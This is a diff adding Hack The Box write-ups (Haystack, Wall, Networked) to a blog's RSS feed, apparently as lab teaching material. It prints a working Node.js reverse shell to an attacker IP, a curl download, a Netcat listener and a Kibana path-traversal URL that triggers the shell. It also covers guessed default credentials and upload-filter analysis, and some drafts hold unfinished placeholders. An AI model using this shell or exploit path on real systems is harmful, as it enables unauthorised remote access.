+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.31&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Prevents the Node.js application from crashing&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I serve it on Kali using Python SimpleHTTPServer and download it to /tmp (where I have write privileges) using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[security@haystack tmp]$ curl -O 10.10.14.31:2222/shell.js                                          
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                     
+                                 Dload  Upload   Total   Spent    Left  Speed                       
+100   382  100   382    0     0   3368      0 --:--:-- --:--:-- --:--:--  3380                      &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I set up my Netcat listener on Kali.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In my browser, I navigate to http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=../../../../../../../../../../tmp/shell . Back on my listener, I get a connection back as user kibana.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.31] from (UNKNOWN) [10.10.10.115] 40280
+whoami
+kibana&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I upgrade to a Python shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+bash-4.2$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;logstash-privilege-escalation&quot;&gt;Logstash privilege escalation&lt;/h1&gt;
+</description>
+        <pubDate>Mon, 07 Oct 2019 13:02:34 -0400</pubDate>
+        <link>http://localhost:4000/writeup/2019/10/07/haystack-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/07/haystack-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
     
       <item>
         <title>Bastion (HTB)</title>
@@ -289,6 +714,817 @@ Password: thXLHM96BeKL0ER2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Sat, 05 Oct 2019 08:00:00 -0400</pubDate>
         <link>http://localhost:4000/writeup/2019/10/05/bastion-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/05/bastion-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
+    
+      <item>
+        <title>Wall</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/wall/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Wall# nmap 10.10.10.157 -sC -sV -oA wall.nmap
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-26 18:42 EDT
+Nmap scan report for 10.10.10.157
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;web-discovery&quot;&gt;Web discovery&lt;/h1&gt;
+&lt;p&gt;http://10.10.10.157 shows a standard “It works!” page, so we have to fuzz for directories and files to find anymore of a web presence. Using &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with the php file extension reveals three new pages:&lt;/p&gt;
+
+&lt;p&gt;SHOW GOBUSTER OUTPUT&lt;/p&gt;
+
+&lt;p&gt;Here’s &lt;code class=&quot;highlighter-rouge&quot;&gt;aa.php&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;Here’s &lt;code class=&quot;highlighter-rouge&quot;&gt;panel.php&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;And here’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wall/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;trying-other-methods&quot;&gt;Trying other methods&lt;/h1&gt;
+&lt;p&gt;I intercepted the three pages with Burp to see if there are any opportunities for user input, but I didn’t find anything interesting. From here, I decided to change all my GET request to POST requests and see what came up. When doing this on &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring&lt;/code&gt;, we find an interesting redirect URL:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;HTTP/1.1 200 OK
+Date: Thu, 26 Sep 2019 23:30:14 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Last-Modified: Wed, 03 Jul 2019 22:47:23 GMT
+ETag: &quot;9a-58ccea50ba4c6-gzip&quot;
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 154
+Connection: close
+Content-Type: text/html
+ 
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This page is not ready yet !&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;We should redirect you to the required page !&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0; URL='/centreon'&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;centreon-login&quot;&gt;Centreon login&lt;/h1&gt;
+
+&lt;p&gt;http://10.10.10.157 shows a Centreon login page along with the version number:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/wall/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got stuck here for a while. I rechecked my enumeration to make sure I didn’t miss any credentials, read up on Centron vulnerabilities, attempted a 2019 CVE on SQL injection, and fired up Hydra to brute-force the log in.&lt;/p&gt;
+
+&lt;p&gt;Strangely, what worked was some manual guesswork (using the first bunch from rockyou.txt). The right combination was admin:password1.&lt;/p&gt;
+
+&lt;h1 id=&quot;rce-exploit--the-easy--way&quot;&gt;RCE exploit – the easy (?) way&lt;/h1&gt;
+
+&lt;p&gt;Aside from the SQLi I’d mentioned, there’s another 2019 CVE available for Centreon: an RCE from the maker of the box.&lt;/p&gt;
+
+&lt;p&gt;INSERT THE SCRIPT&lt;/p&gt;
+
+&lt;p&gt;This isn’t as straightforward as I’d hoped it would be though. I inserted some &lt;code class=&quot;highlighter-rouge&quot;&gt;print&lt;/code&gt; statements throughout the script to ensure that the &lt;code class=&quot;highlighter-rouge&quot;&gt;requests&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;BeautifulSoup&lt;/code&gt; modules weren’t grabbing/parsing nonsense, and even when it seemed to be spot-on, I couldn’t verify that I had command execution. So I decided to follow the script along myself and manually trigger the exploit.&lt;/p&gt;
+
+&lt;h1 id=&quot;rce-exploit--the-other-easy-way&quot;&gt;RCE exploit – the other easy way&lt;/h1&gt;
+
+</description>
+        <pubDate>Fri, 04 Oct 2019 14:31:26 -0400</pubDate>
+        <link>http://localhost:4000/writeup/2019/10/04/wall-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/04/wall-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
+    
+      <item>
+        <title>Networked</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/networked/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nmap -sC -sV 10.10.10.146
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-28 18:09 EDT
+Nmap scan report for 10.10.10.146
+Host is up (0.053s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+443/tcp closed https
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;web-discovery&quot;&gt;Web discovery&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Networked# gobuster dir -u http://10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php
+===============================================================                                     
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)                                     
+===============================================================                                     
+[+] Url:            http://10.10.10.146
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt          
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================                                     
+2019/09/28 18:15:20 Starting gobuster
+===============================================================                                     
+/index.php (Status: 200)
+/uploads (Status: 301)
+/photos.php (Status: 200)
+/upload.php (Status: 200)
+/lib.php (Status: 200)
+/backup (Status: 301)
+===============================================================                                     
+2019/09/28 18:55:42 Finished
+===============================================================                                     &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At /upload.php, there’s a file uploader.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we upload a TXT file, it fails:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But if we try an image file–like a PNG–it succeeds:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we visit /photos.php, my image is rendered (on the left).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So what I’d want to do is upload a PHP reverse shell and visit /photos.php to execute it. But there’s clearly some filtering going on in the file upload function.&lt;/p&gt;
+
+&lt;h1 id=&quot;analyzing-the-php-files&quot;&gt;Analyzing the PHP files&lt;/h1&gt;
+
+&lt;p&gt;Luckily, in /backup, all the PHP code is readily available in a TAR file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just extract it, and you’ll see the code behind all the web pages.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/networked/image6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What’s relevant to our exploit are upload.php–which shows the code behind the upload page–and lib.php–which defines the functions used in upload.php.&lt;/p&gt;
+
+&lt;p&gt;From upload.php:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[&quot;name&quot;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getnameUpload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.gif'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.jpeg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr_compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If the file ends in “.jpg”, “.png”, “.gif”, or “.jpeg”, it will return True. This is crucial to keep in mind when trying to bypass the file upload.&lt;/p&gt;
+
+&lt;p&gt;Another important snippet of upload.php shows why we’re triggering that error message:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'myFile'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;pre&amp;gt;Invalid image file.&amp;lt;/pre&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This indicates that if our file doesn’t return True for the check_file_type function (or is larger than 60000 bytes), we get the “Invalid image file” error. The check_file_type function is in lib.php:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'image/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If the file content type begins with ‘image/’ (as JPG, PNG, and GIF files do), our file will pass the test. And what does the file_mime_type function do?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file_mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$regexp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
